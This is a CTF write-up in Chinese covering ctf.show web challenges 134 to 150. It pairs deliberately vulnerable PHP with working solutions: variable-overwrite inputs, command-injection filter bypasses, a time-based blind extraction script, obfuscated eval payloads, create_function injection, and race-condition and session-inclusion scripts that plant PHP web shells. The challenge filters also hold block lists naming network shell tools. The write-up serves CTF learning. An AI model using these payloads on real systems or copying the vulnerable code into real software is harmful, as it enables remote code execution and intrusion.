[DNSLog Platform](http://dnslog.cn/)

# web134

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-14 23:01:06

*/

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

![image-20221005164002858](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051640925.png?x-oss-process=hzy)

使用get传参

```
?_POST[key1]=36d&_POST[key2]=36d
```

> @parse_str($_SERVER['QUERY_STRING']); 将数据转化为了$_POST[key1]=36d 接着extract($_POST)将$_POST[key1]=36d转化为了$key=36d

![image-20221005164200531](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051642632.png?x-oss-process=hzy)

# web135

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

web133的加强版

![image-20221005164506615](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051645691.png?x-oss-process=hzy)

还是可以执行的，但是这里过滤了更多，其中curl也过滤了。

把flag数据转存到另外一个路径文件下

![image-20221005164729912](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051647979.png?x-oss-process=hzy)

![image-20221005164712595](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051647665.png?x-oss-process=hzy)

# web136

```
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

传参c，命令执行，也是无回显，并且过滤了>,和cp，没办法转存到其他文件下

使用tee

```
ls|tee f
ls /|tee f
cat /f149_15_h3r3|tee f
```



> ```shell
> tee a.txt b.txt，将a.txt复制到b.txt
> ls | tee b.txt,将ls命令的执行结果写入b.txt
> ```

![image-20221005165456193](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051654257.png?x-oss-process=hzy)

# web137

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:27:49

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}



call_user_func($_POST['ctfshow']);
```

直接调用getflag这个类即可

```
ctfshow=ctfshow::getFlag
```

![image-20221005165913371](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051659436.png?x-oss-process=hzy)

> php中 ->与:: 调用类中的成员的区别
> ->用于动态语境处理某个类的某个实例
> ::可以调用一个静态的、不依赖于其他初始化的类方法.
>
> 双冒号可以不用实例化类就可以直接调用类中的方法

# web138

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:52:13

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);


```

![image-20221005170206720](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051702784.png?x-oss-process=hzy)

用这个函数也就是过滤：的意思

call_user_func中不但可以传字符串也可以传数组

> call_user_func(array($classname, 'hello'));
> 此时会调用 classname中的 hello方法

所以这道题目就可以这样

```
ctfshow[0]=ctfshow&ctfshow[1]=getflag
```

![image-20221005170809291](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051708365.png?x-oss-process=hzy)



# web139

```
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

web136的升级版，虽然代码没变化但是应该是把tee过滤了，外带不出内容了，盲打

所以要截取字符串，使用awk命令

判断命令执行结果可以使用shell编程的语句以及sleep函数

![image-20221005171848871](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051718946.png?x-oss-process=hzy)

然后使用cut命令截取每个字符

![image-20221005171935941](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051719008.png?x-oss-process=hzy)



shell编程,if语句控制输出,sleep控制相应时间

![image-20221005172219427](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051722492.png?x-oss-process=hzy)

脚本如下

```
import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
	print(j)
	if key==1:
		break
	for n in str:
		payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
		#print(payload)
		url="http://3d4bd4f4-65e4-497e-bf70-06d999bc350e.challenge.ctf.show/?c="+payload
		try:
			requests.get(url,timeout=(2.5,2.5))
		except:
		    result=result+n
		    print(result)
		    break

```

![image-20221005172317069](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051723143.png?x-oss-process=hzy)
ctfshow{cf501030201b8c14e2ab0647f0813547211a00de441f}

# web140

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 12:39:25

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}


```

intval($code) == 'ctfshow'这地方只需要满足前者code等于0即可

![image-20221006153858304](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061538405.png?x-oss-process=hzy)

​    

数字和字符串弱比较

```
f1=usleep&f2=usleep
f1=gmdate&f2=gmdate
f1=intval&f2=intval
```

![image-20221006154140542](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061541625.png?x-oss-process=hzy)

# web141

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 19:28:09

*/

#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

```

> is_numeric — 检测变量是否为数字或数字字符串 (是，true；否，false)

> \W是匹配非字母数字下划<===>[^A-Za-z0-9_]
>
> \w是匹配字母数字下划线<===>[A-Za-z0-9_]

所以这道题目是无参rce

命令执行，通过拼接构造命令

```
v1=1&v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&v2=1
```

![image-20221006154813016](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061548109.png?x-oss-process=hzy)

参考

[(62条消息) CTFShow web入门123-150 (php特性(二))_lonmar~的博客-CSDN博客](https://blog.csdn.net/weixin_45551083/article/details/110574834)

# web142

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 19:36:02

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
	
```

这道题目就是绕过sleep，直接赋值0即可

![image-20221006155124878](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061551949.png?x-oss-process=hzy)

# web143



```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 12:48:14

*/

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

在web141的基础上又过滤了`-`和`;`，那么v3开头和结尾的符号就可以变成`*`或`/`

```
?v1=1&v2=2&v3=*("%13%19%13%14%05%0d"^"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%02%10%08%10"^"%60%60%60%20%60%60%60%60%2c%60%60%60")?>
```

![image-20221006155332027](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061553102.png?x-oss-process=hzy)



# web144

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 16:21:15

*/

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

check函数限制v3长度为1

换一下位置即可，paylaod同上

# web145

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 17:41:33

*/


highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
?v1=1&v2=2&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%03%01%14%00%06%0c%01%07%02%10%08%10'|'%60%60%60%20%60%60%60%60%2c%60%60%60')|
```

![image-20221006155753920](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061557994.png?x-oss-process=hzy)

# web146

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 17:41:33

*/


highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

上一题的升级版

同上

# web147

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 02:04:38

*/



highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

> php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法

> `\`是全局命名空间，由于命名空间问题，如果要绝对调用一个函数，例如system，那么就要写成`\system`

```
?show=;};phpinfo();/*
ctf=\create_function
```

[PHP create_function()代码注入](https://my.oschina.net/huyex/blog/2885273)

![image-20221006160341150](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061603232.png?x-oss-process=hzy)

# web148

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 03:52:11

*/



include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

无参rce

```
/?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%0c%01%07%01%0b%08%0b"^"%7d%60%60%21%60%60%60%60%2f%7b%60%7b");
```

![image-20221006160657677](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061606754.png?x-oss-process=hzy)

# web149

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 04:34:40

*/


error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

条件竞争

```
import io
import requests
import threading

url = 'http://d3aa0fa3-8a63-4994-8a43-80891c436065.chall.ctf.show/'


def write():
    while event.isSet():
        data = {
            'show': '<?php system("cat /ctfshow_fl0g_here.txt");?>'
        }
        requests.post(url=url+'?ctf=1.php', data=data)


def read():
    while event.isSet():
        response = requests.get(url + '1.php')
        if response.status_code != 404:
            print(response.text)
            event.clear()


if __name__ == "__main__":
    event = threading.Event()
    event.set()
    for i in range(1, 100):
        threading.Thread(target=write).start()

    for i in range(1, 100):
        threading.Thread(target=read).start()


```

还有个非预期就是直接写🐎

```
GET ?ctf=index.php
POST show=<?php eval($_POST[hack]);?>
```

# web150

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 07:12:57

*/
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}

```

包含session

```
# -*- coding: utf-8 -*-
# @Time : 20.12.5 13:52
# @author:lonmar
import io
import requests
import threading

sessid = 'test'
data = {
    "ctf": "/tmp/sess_test",
    "cmd": 'system("cat flag.php");'
}


def write(session):
    while event.isSet():
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post('http://17787258-2baa-4fff-a0c2-75d262f85b01.challenge.ctf.show/',
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
                            files={'file': ('test.txt', f)}, cookies={'PHPSESSID': sessid})


def read(session):
    while event.isSet():
        res = session.post(
            'http://17787258-2baa-4fff-a0c2-75d262f85b01.challenge.ctf.show/?isVIP=1',
            data=data
        )
        if 'flag{' in res.text:
            print(res.text)
            event.clear()
        else:
            print('[*]retrying...')


if __name__ == "__main__":
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 5):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 5):
            threading.Thread(target=read, args=(session,)).start()

```

# web150_plus

只是多了一个log的过滤，同上

